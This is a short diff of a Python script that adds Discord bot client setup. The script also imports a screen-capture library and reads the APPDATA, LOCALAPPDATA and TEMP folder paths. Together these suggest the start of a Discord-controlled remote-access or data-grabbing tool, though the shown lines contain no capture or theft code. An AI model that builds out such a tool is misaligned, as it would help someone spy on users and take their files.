@@ -5,6 +5,10 @@ from PIL import ImageGrab
 from datetime import datetime
 from discord import *
 
+intents = discord.Intents.default()
+client = discord.Client(intents=intents)
+tree = app_commands.CommandTree(client)
+
 APPDATA = os.getenv("APPDATA")
 LOCALAPPDATA = os.getenv("LOCALAPPDATA")
 TEMP = os.getenv("TEMP")
